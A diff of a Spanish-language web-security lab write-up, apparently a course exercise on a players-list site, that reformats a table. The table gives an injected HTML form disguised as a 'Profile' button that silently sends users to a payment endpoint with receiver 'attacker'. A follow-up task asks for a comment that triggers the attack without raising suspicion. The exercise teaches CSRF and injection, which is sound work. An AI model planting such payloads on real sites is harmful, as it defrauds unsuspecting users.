@@ -377,26 +377,9 @@ if (!$username || strlen($username) < 3 || strlen($username) > 20) {
 
    a) Editad un jugador para conseguir que, en el listado de jugadores list\\_players.php aparezca, debajo del nombre de su equipo y antes de show/add comments un botón llamado Profile que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.
 
-| En el campo... | 
-| --------------- | 
-| ```html  
-<div>  
-    <a href="show_comments.php?id=".$row['playerid'].">(show/add comments)</a>  
-    <a href="insert_player.php?id=".$row['playerid'].">(edit player)</a>  
-</div>  
-</li>  
-}  
-``` |
+| En el campo... | ```html
 
-| Introduzco... |
-| --------------- |
-| ```html  
-<form action='http://web.pagos/donate.php' method='get' style='display:inline;'>  
-    <input type='hidden' name='amount' value='100'>  
-    <input type='hidden' name='receiver' value='attacker'>  
-    <input type='submit' value='Profile' style='cursor:pointer;'>  
-</form>  
-``` |
+<div> <a href="show_comments.php?id=".$row['playerid'].">(show/add comments)</a> <a href="insert_player.php?id=".$row['playerid'].">(edit player)</a> </div> </li> } ``` | | --------------- | --------------- | | Introduzco... | ```html <form action='http://web.pagos/donate.php' method='get' style='display:inline;'> <input type='hidden' name='amount' value='100'> <input type='hidden' name='receiver' value='attacker'> <input type='submit' value='Profile' style='cursor:pointer;'> </form> ``` |
 
 
    **b)** Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que el usuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (show\_comments.php).
